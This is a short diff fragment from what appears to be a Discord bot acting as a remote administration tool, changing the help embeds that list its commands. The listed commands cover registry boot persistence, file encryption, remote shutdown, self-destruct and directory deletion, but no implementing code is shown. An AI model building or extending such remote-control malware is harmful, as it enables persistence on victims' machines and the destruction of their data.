@@ -76,8 +76,8 @@ async def on_message(message):
         embed.add_field(name=".setup", value="RUN BEFORE USING ENCRYPTION METHODS! Inserts itself into boot registry, creates an encryption key and stores it into the registry.", inline=False)
         embed.add_field(name=".encrypt", value="Encrypt file [WIP]", inline=False)
         embed.add_field(name=".decrypt", value="Decrypt file [WIP]", inline=False)
-
-        embed2 = discord.Embed(title="Command list", description="", color=0x00ff00)
+        
+        embed2 = discord.Embed(title="", description="", color=0x00ff00)
         embed2.add_field(name=".selfdestruct", value="Self destruct.", inline=False)
         embed2.add_field(name=".shutdown", value="Shutdown the computer.", inline=False)
         embed2.add_field(name=".deletedir", value="Deletes a specified directory. Usage: ``.deletedir <target_folder>``", inline=False)
